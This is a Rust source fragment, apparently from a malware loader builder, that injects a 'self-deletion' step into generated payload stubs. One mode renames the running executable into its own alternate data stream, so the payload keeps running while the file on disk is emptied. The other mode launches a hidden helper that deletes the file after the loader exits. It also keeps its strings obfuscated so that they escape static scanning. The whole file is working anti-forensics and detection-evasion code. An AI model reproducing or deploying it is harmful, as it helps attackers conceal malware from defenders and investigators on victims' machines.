// --- Self-deletion (technique fragment) ---
//
// This file is injected verbatim into the generated stub's `mod step_<index>`
// when the technique is selected, so it is self-contained: its own `use`
// statements, constants and helpers, all resolved inside that module.
//
// Per-build values use the technique's placeholder tokens, substituted by
// `Params::render_fragment` (see `mod.rs`); the tokens are not valid Rust
// identifiers, so nothing can rewrite them silently. Do not switch back to
// double-brace placeholders: those are valid Rust (nested blocks), and tooling
// reformats them into something the substitution no longer matches.
//
// Two variants, both measured against a *mapped* image (see the README):
//
//   `mode: rename_ads` (default)
//     1. Read the running image's path (`GetModuleFileNameW`, a loader entry
//        point, not a kernel call).
//     2. Open it with `DELETE | SYNCHRONIZE` and `FILE_SHARE_READ`, then
//        `nt_set_info_file` with `FileRenameInformation` (class 10) and a
//        `FILE_RENAME_INFO` that renames the file to `:stream` — an alternate
//        data stream of itself. The loader's bytes leave the default stream, so
//        the path is left as a zero-byte file while the payload keeps executing
//        from the still-mapped section.
//        Windows refuses the *delete* of a mapped image
//        (`STATUS_CANNOT_DELETE`/`ERROR_ACCESS_DENIED`, measured), which is why
//        this is the default and `FileDispositionInformation*` is not.
//
//   `mode: helper`
//     1. Same path lookup.
//     2. `CreateProcessA` a detached command interpreter that sleeps a couple of
//        seconds and then deletes the file. The loader exits right after its last
//        step, so by the time the helper deletes it the image is no longer mapped
//        and the file really goes away.
//
// A preparation returns `Ok(true)` to let the chain continue: self-deletion is
// not a reason to stop the payload. Its position in `runtime:` is what decides
// when it happens — before a terminal execution step (so the file is dealt with
// before the payload takes over) or after a returning one.
//
// Every diagnostic goes through a message placeholder (rebuilt at run time by
// the renderer), and so do the helper's name, its command line and the stream
// name: none of them may appear in the artifact's `.rdata`.

use core::ffi::c_void;
use core::ptr;

use windows::core::{PCSTR, PCWSTR, PSTR};
use windows::Win32::Foundation::{BOOL, HANDLE, HMODULE};
use windows::Win32::Storage::FileSystem::{
    CreateFileW, DELETE, FILE_FLAGS_AND_ATTRIBUTES, FILE_SHARE_READ, OPEN_EXISTING,
};
use windows::Win32::System::LibraryLoader::GetModuleFileNameW;
use windows::Win32::System::Threading::{
    CreateProcessA, CREATE_NO_WINDOW, PROCESS_INFORMATION, STARTUPINFOA,
};

/// `FileRenameInformation` (`FILE_INFORMATION_CLASS` 10).
const FILE_RENAME_INFORMATION_CLASS: i32 = 10;

/// `FILE_ATTRIBUTE_NORMAL` (`winbase.h`): no attributes are passed on an open of
/// an existing file.
const FILE_ATTRIBUTE_NORMAL: u32 = 0x0000_0080;

/// `SYNCHRONIZE`: the rename path needs a handle that can be waited on (the
/// documented shape of `FILE_RENAME_INFORMATION` operations on a mapped image).
const SYNCHRONIZE: u32 = 0x0010_0000;

/// `FILE_RENAME_INFO` (`winbase.h`), the layout `FileRenameInformation` expects:
/// a `ReplaceIfExists` dword (with its padding), the optional root directory
/// handle, the name length in bytes and the UTF-16 name itself.
///
/// Written as a byte buffer instead of a struct because the name is variable
/// length and the union's padding is not something to leave to the compiler.
const RENAME_INFO_HEADER: usize = 20;

/// The running image's path as a NUL-terminated UTF-16 buffer.
fn image_path() -> Result<Vec<u16>, String> {
    // Long enough for any path the API documents (32 KB would be the maximum; a
    // loader living that deep in a directory tree is not worth the stack).
    let mut buffer = [0u16; 4096];
    let len = unsafe { GetModuleFileNameW(HMODULE(ptr::null_mut()), &mut buffer) };
    if len == 0 {
        return Err($MSG_PATH_FAILED$);
    }
    let mut path = buffer[..len as usize].to_vec();
    path.push(0);
    Ok(path)
}

/// Opens the running image for a metadata change.
///
/// `FILE_SHARE_READ` and nothing else is deliberate: it is the share mode the
/// loader's own image section tolerates, and it is what the working variant was
/// measured with.
fn open_image(path: &[u16]) -> Result<HANDLE, String> {
    // SAFETY: `path` is NUL-terminated and outlives the call, the security
    // attributes are null and no template file is used.
    unsafe {
        CreateFileW(
            PCWSTR(path.as_ptr()),
            DELETE.0 | SYNCHRONIZE,
            FILE_SHARE_READ,
            None,
            OPEN_EXISTING,
            FILE_FLAGS_AND_ATTRIBUTES(FILE_ATTRIBUTE_NORMAL),
            HANDLE(ptr::null_mut()),
        )
        .map_err(|e| nt_error($MSG_OPEN_FAILED$, e.code().0))
    }
}

/// Moves the image into an alternate data stream of its own path.
fn hide_in_stream(path: &[u16]) -> Result<(), String> {
    let stream: String = $STREAM_DEF$;
    let name: Vec<u16> = stream.encode_utf16().collect();
    let mut info = vec![0u8; RENAME_INFO_HEADER + name.len() * 2];
    // `ReplaceIfExists = TRUE`.
    info[0..4].copy_from_slice(&1u32.to_le_bytes());
    // The root directory handle stays null: the name is a stream of the file the
    // handle already refers to.
    info[16..20].copy_from_slice(&((name.len() * 2) as u32).to_le_bytes());
    for (index, unit) in name.iter().enumerate() {
        let at = RENAME_INFO_HEADER + index * 2;
        info[at..at + 2].copy_from_slice(&unit.to_le_bytes());
    }

    let handle = open_image(path)?;
    let mut io_status: [u64; 2] = [0; 2];
    // The structure is the `FILE_RENAME_INFO` layout for class 10 (`info` is
    // alive for the call) and the handle is closed below on both paths.
    let status = crate::nt_set_info_file(
        handle,
        io_status.as_mut_ptr() as *mut c_void,
        info.as_ptr() as *const c_void,
        info.len() as u32,
        FILE_RENAME_INFORMATION_CLASS,
    );
    let _ = crate::nt_close(handle);

    if status < 0 {
        return Err(nt_error($MSG_RENAME_FAILED$, status));
    }
    Ok(())
}

/// Starts a detached helper that deletes the image once this process is gone.
fn spawn_helper(path: &[u16]) -> Result<(), String> {
    let helper: String = $HELPER_DEF$;
    let prefix: String = $HELPER_ARGS_DEF$;
    // The command line starts with the image name so `CreateProcessA` resolves it
    // through `PATH` (a bare name is *not* searched when it is passed as the
    // application name), and the path is quoted so a directory with spaces does
    // not split it.
    let command = format!(
        "{helper} {prefix}\"{}\"",
        String::from_utf16_lossy(&path[..path.len() - 1])
    );
    let mut args = command.into_bytes();
    args.push(0);

    let mut startup: STARTUPINFOA = unsafe { core::mem::zeroed() };
    startup.cb = core::mem::size_of::<STARTUPINFOA>() as u32;
    let mut info: PROCESS_INFORMATION = unsafe { core::mem::zeroed() };

    // SAFETY: the command line is NUL-terminated and outlives the call, `startup`
    // is initialized per the API contract (`cb` is set), and `info` is written by
    // the call. `CREATE_NO_WINDOW` keeps the helper invisible; the loader does not
    // wait for it.
    unsafe {
        CreateProcessA(
            PCSTR::null(),
            PSTR(args.as_mut_ptr()),
            None,
            None,
            BOOL(0),
            CREATE_NO_WINDOW,
            None,
            PCSTR::null(),
            &startup,
            &mut info,
        )
        .map_err(|e| nt_error($MSG_HELPER_FAILED$, e.code().0))?;
    }
    let _ = crate::nt_close(info.hThread);
    let _ = crate::nt_close(info.hProcess);
    Ok(())
}

/// Appends a status to a label (which is rebuilt from obfuscated bytes at the
/// call site, so this literal carries no diagnostic text).
fn nt_error(label: String, status: i32) -> String {
    format!("{label} (0x{:08x})", status as u32)
}

/// Removes the running image from the file system. Returns `Ok(true)`: the chain
/// continues.
pub fn self_deletion() -> Result<bool, String> {
    let path = image_path()?;

    // The branch is selected at build time; both sides have to type-check, which
    // is why the helpers are separate functions.
    if $RENAME_ADS$ {
        hide_in_stream(&path)?;
    } else {
        spawn_helper(&path)?;
    }

    crate::tech_dbg!(
        "self_deletion",
        "the running image has been dealt with (rename to an alternate data stream: {})",
        $RENAME_ADS$
    );
    Ok(true)
}
